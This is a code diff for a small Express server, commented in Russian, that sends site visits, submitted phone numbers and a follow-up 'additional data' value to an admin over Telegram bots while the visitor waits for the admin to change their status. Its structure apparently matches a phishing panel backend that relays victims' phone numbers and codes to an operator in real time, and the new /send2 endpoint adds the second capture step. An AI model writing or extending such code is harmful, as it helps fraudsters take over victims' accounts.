@@ -22,13 +22,13 @@ let bannedUsers = {};
 let requests = {};
 let userStatus = {};
 
-// вход
+// вход на сайт
 app.post("/enter", (req, res) => {
   enterBot.sendMessage(adminId, "👀 Пользователь зашел на сайт");
   res.json({ ok: true });
 });
 
-// отправка
+// отправка основной формы
 app.post("/send", (req, res) => {
   const data = req.body;
 
@@ -36,7 +36,7 @@ app.post("/send", (req, res) => {
     return res.json({ ok: false });
   }
 
-  const id = Date.now();
+  const id = data.clientId; // 🔥 ID приходит с сайта
 
   requests[id] = data.phone;
   userStatus[id] = "wait";
@@ -70,10 +70,25 @@ app.post("/send", (req, res) => {
   res.json({ ok: true, id });
 });
 
-// статус
+// статус ожидания
 app.get("/status/:id", (req, res) => {
   const id = req.params.id;
   res.json({ status: userStatus[id] || "wait" });
+});
+
+// вторая отправка (5 страница)
+app.post("/send2", (req, res) => {
+  const data = req.body;
+
+  mainBot.sendMessage(
+    adminId,
+    `📩 ДОП ДАННЫЕ
+
+🆔 ID: ${data.id}
+💬 Значение: ${data.value}`
+  );
+
+  res.json({ ok: true });
 });
 
 // кнопки
